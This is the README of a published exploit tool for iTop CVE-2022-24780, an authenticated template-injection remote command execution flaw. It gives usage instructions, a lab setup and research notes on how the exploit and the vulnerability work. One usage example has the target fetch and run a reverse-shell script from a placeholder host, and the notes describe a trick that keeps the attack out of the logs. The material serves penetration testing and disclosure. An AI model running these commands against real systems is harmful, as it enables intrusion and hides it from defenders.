# iTop RCE via SSTI - CVE-2022-24780 exploit

> iTop < 2.7.6 - (Authenticated) Remote command execution

Exploit for [CVE-2022-24780][CVE-2022-24780].

[[EDB-TODO](https://www.exploit-db.com/exploits/TODO)] [[PacketStorm](https://packetstormsecurity.com/files/167236/iTop-Remote-Command-Execution.html)] [[WLB-2022050075](https://cxsecurity.com/issue/WLB-2022050075)]

## Usage

```
$ ruby exploit.rb -h
iTop < 2.7.6 - (Authenticated) Remote command execution

Usage:
  exploit.rb full <url> <username> <password> <cmd> [--debug]
  exploit.rb light <url> <username> <password> <cmd> [--debug]
  exploit.rb -h | --help

  full: exploit with an emulated browser, execute JavaScript, preserve original user profile information
  light: just parse HTML and send requests, no JavaScript, (DESTRUCTIVE) reset user information: phone, location, function

Options:
  <url>       Root URL (base path) including HTTP scheme, port and root folder
  <username>  iTop portal username
  <password>  iTop portal user password
  <cmd>       Command to execute on the target
  --debug     Display arguments
  -h, --help  Show this screen

Examples:
  exploit.rb full http://example.org john 's9nvEIZnEo6ghi' 'echo proof > /var/www/html/proof.txt'
  exploit.rb light https://example.org:5000/itop john 's9nvEIZnEo6ghi' 'curl --remote-name http://pentest.example.com:7000/revshell.pl; perl revshell.pl'
```

## Flavor

The **full** flavor of the exploit is using [Watir](http://watir.com/) using a web browser driven by [Selenium](https://www.selenium.dev/) to emulate a user browsing. This is required to preserve user information. The exploit inject an SSTI payload in a sub-part of the form used to modify user information on the portal user profile. While some values can be hardcoded or retrieved from the HTML others (phone, location, function) are loaded dynamically via Javascript and injected into the HTML. So in order for the exploit to not be destructive, it's necessary to execute JavaScript to be able to retrieve those values.

The **light** flavor of the exploit is not caring that much and will just destructively set a null value to some user information fields (phone, location, function) instead. However this flavor is faster to execute, requires less dependencies, won't execute any JavaScript, and doesn't need a X environment (Watir does to run the web browser).

## Requirements

**TL;DR**: install all `bundle install`

**Full** flavor

- [httpx](https://gitlab.com/honeyryderchuck/httpx)
- [docopt.rb](https://github.com/docopt/docopt.rb)
- [watir](https://github.com/watir/watir)
- [webdrivers](https://github.com/titusfortner/webdrivers)

Example using gem:

```bash
gem install httpx docopt watir webdrivers
```

**Light** flavor

- [httpx](https://gitlab.com/honeyryderchuck/httpx)
- [docopt.rb](https://github.com/docopt/docopt.rb)
- [Nokogiri](https://github.com/sparklemotion/nokogiri)

Example using gem:

```bash
gem install httpx docopt nokogiri
```

## Limitations

It is not recommended to use payloads with double quotes (`"`) nor backslashes (`\`) because the payload is injected into JSON.

## Docker deployment of the vulnerable software

**Warning**: this container is not suited for production usage!

Using `vbkunin/itop:2.7.4` - [source](https://github.com/vbkunin/itop-docker/tree/2.7.4) - [docker hub](https://hub.docker.com/layers/itop/vbkunin/itop/2.7.4/images/sha256-d2501b3a5f31a38c7a4edf9bddddb02bfc79542b7eceef5b6c6168ebba631048?context=explore)

```
$ docker run -d -p 8000:80 --name=itop-CVE-2022-24780 vbkunin/itop:2.7.4
```

## References

- Target software: **iTop**
  - Homepage: https://www.itophub.io/
  - Vendor: https://www.combodo.com/itop
  - Online demo: https://www.combodo.com/itop-access-to-the-demonstration
  - Source:
    - https://github.com/Combodo/iTop
    - https://sourceforge.net/projects/itop/files/itop/
  - Vulnerable version:
    - 2.x branch: < 2.7.6
    - 3.x branch: < 3.0.0 (eg. 3.0.0-beta-7312)
  - Patches:
    - https://github.com/Combodo/iTop/commit/b6fac4b411b8d145fc30fa35c66b51243eafd06b
    - https://github.com/Combodo/iTop/commit/eb2a615bd28100442c7f6171707bb40884af2305
    - https://github.com/Combodo/iTop/commit/93f273a28778e5da8e51096f021d2dc1adbf4ef3
  - Advisories:
    - https://www.opencve.io/cve/CVE-2022-24780
    - https://github.com/Combodo/iTop/security/advisories/GHSA-v97m-wgxq-rh54
    - https://attackerkb.com/topics/tcUqij2rjR/cve-2022-24780

The vulnerability was found by [Markus KRELL](https://markus-krell.de/).

Analysis of the vulnerability by the discoverer:

- [iTop – Template Injection inside customer Portal](https://markus-krell.de/itop-template-injection-inside-customer-portal/)

## Disclaimer

ACCEIS does not promote or encourage any illegal activity, all content provided by this repository is meant for research, educational, and threat detection purpose only.

## Research

### The exploit

As a security auditor (or any other white hat role), on one hand you want to run an exploit script to verify the effective practical exploitability of the theoretical vulnerability based on the version number of the application you identified, but on the other hand you want it to be done properly without any destructive action so that the customer application is left in the same state as you first discovered it.

For example, this exploit occurs on the user profile page, so there is a form with information from the user that is already populated: first name, name, organization ID, email, phone, location ID, function, manager ID. For the attack to work, you just need to override the vulnerable fields and fill others with null values or random values if they are required. It is what the **light** flavor of the exploit is doing. But doing so you will destruct the actual information for that user, it's not problematic on a test environment however it is a real problem if you are on a production environnement. A black hat won't care about all that, but as a white hat we have to preserve the data. So the solution is to fetch the actual data and reuse it on our POST request.

On classical web applications, you often just have to directly craft a POST request with the right parameters targeting the vulnerable endpoint. Sometimes you need to handle session / cookies, redirections, some previous states that may be required, fetching some ID or anti-CSRF tokens but all of that remains very straightforward and can be achieved with pretty much all HTTP library in any language.

In order to retrieve the actual data, when the data in the form comes from:

- the **server response**, you just have to scrap the page and parse HTML ;
- an **XHR** which is made to an API and the data is replaced in the HTML by JavaScript, you don't need JavaScript, you can forge another POST request to the API to retrieve the data yourself.

It begins to be a little more touchy on some modern web applications where many values are set from complex JavaScript manipulations.
Here you can't just parse HTML or request a REST API, you can't either retrieve the value from a JavaScript file directly or parse several lines and recompute a value. When the JS computation is so complex, happens in many different JS files or that the JavaScript source code is obfuscated or packed, it would requires way to many efforts and time to reverse engineer the mechanism and extract the value. In that case, you actually have to interact with the JavaScript from the application. But a classic exploit script just requiring a HTTP library can't do that (alone)!

Exploiting the vulnerability manually is easy, you just browse the application, let your browser handle all the JavaScript, just set an intercepting proxy like Burp Suite to be able to modify the request before it is sent and you are fine. But doing the same thing on an automated way is way harder. To interact and execute the JavaScript we need a headless browser (that may or may not require a display environment) and an user emulation library. Fortunately there are already advanced functional test libraries we can use to drive the headless browser. The most famous is Selenium, but there is also Cypress. Outside of test suites, there are also libraries that offer more generic automation like Playwright or puppeteer. In both case, it's using a DSL that mimic the user behavior just as if a user was using the application, so the code we will write will tell the browser "click here", "enter my name in the name field", "click this link", etc. The limit of testing frameworks is that they only allow you to do what a normal user would do, for example a normal user don't fetch the content of a script tag or hidden field, so you can't do that either. They are also meant to fetch values and compare them with what you expect, not to set them. Also the execution using an headless browser is much slower and may requires some cumbersome DSL writing. So in the end we want to use the headless browser and test framework the least we can.

What the **light** flavor of the exploit does is connecting to the application, fetching the user profile form to retrieve all the values it can and using blank values for the phone number, location ID and function, then sending the exploit.

However what the **full** flavor of the exploit does is connecting to the application, fetching the user profile form to retrieve all the values it can, then use the headless browser to connect, fetch the user profile form to retrieve the 3 values that were set from JavaScript, then sending the exploit. It's pretty much the same process except we don't use null values for data fields populated in JavaScript but actually retrieve them with a headless browser that will execute the JavaScript that populate those values to be able to retrieve them. It's also technically possible to 100% write the exploit using only the headless browser but we will have to face the limitations discussed before, that is why I chose the hybrid approach with minimal use of the headless browser.

### The vulnerability

The discoverer of the vulnerability [CVE-2022-24780][CVE-2022-24780], [Markus KRELL](https://markus-krell.de/), wrote a detailed analysis blog article: [iTop – Template Injection inside customer Portal](https://markus-krell.de/itop-template-injection-inside-customer-portal/).

In short the vulnerability happens on user profile change. When the user submit the form to update its information it will send a huge JSON object containing various metadata for the backend but the user data to update is stored as XHTML in the JSON `formproperties.layout.content` sub-node. But Markus spotted in the [source code](https://github.com/Combodo/iTop/blob/473a49ab6bac9275a123155c6c80c1f763ff9f9a/datamodels/2.x/itop-portal-base/portal/src/Brick/UserProfileBrick.php#L221) that `formproperties.layout.type` could accept both XHTML or Twig. Of course when he saw Twig mentioned he immediately thought about potential SSTI. So he tried every fields in the content to identify a vulnerable one and found that the `data-field-id` and `data-field-flags` attributes are vulnerable. Then it is possible to use classical [Twig template injection payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig). Still, as a bonus he discovered that appending `|join(',')` to the expression would convert the resulting array into a string and by doing so avoid an entry into the logs of iTop to make the attack stealthier.

[CVE-2022-24780]:https://nvd.nist.gov/vuln/detail/CVE-2022-24780
